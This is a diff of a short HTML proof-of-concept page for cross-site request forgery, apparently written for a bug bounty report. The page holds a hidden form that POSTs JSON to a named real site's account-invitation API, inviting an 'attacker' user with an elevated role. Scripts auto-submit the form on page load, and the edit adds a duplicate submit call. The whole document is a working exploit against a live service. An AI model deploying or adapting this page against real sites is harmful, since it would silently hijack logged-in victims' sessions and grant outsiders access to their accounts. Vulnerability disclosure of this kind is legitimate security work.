@@ -2,13 +2,17 @@
 <html>
 <body>
   <h1>CSRF PoC - Form text/plain</h1>
-  <form id="csrfForm"
-        action="https://www.sellingpilot.com/api/account/inviting?_xhr=true"
-        method="POST"
-        enctype="text/plain">
-    <input type="hidden"
-           name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us"}'>
-  </form>
+ <form id="csrfForm"
+      action="https://www.sellingpilot.com/api/account/inviting?_xhr=true"
+      method="POST"
+      enctype="text/plain">
+  <input type="hidden"
+         name="data"
+         value='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us"}'>
+</form>
+<script>
+  document.getElementById("csrfForm").submit();
+</script>
   <script>
     document.getElementById('csrfForm').submit();
   </script>
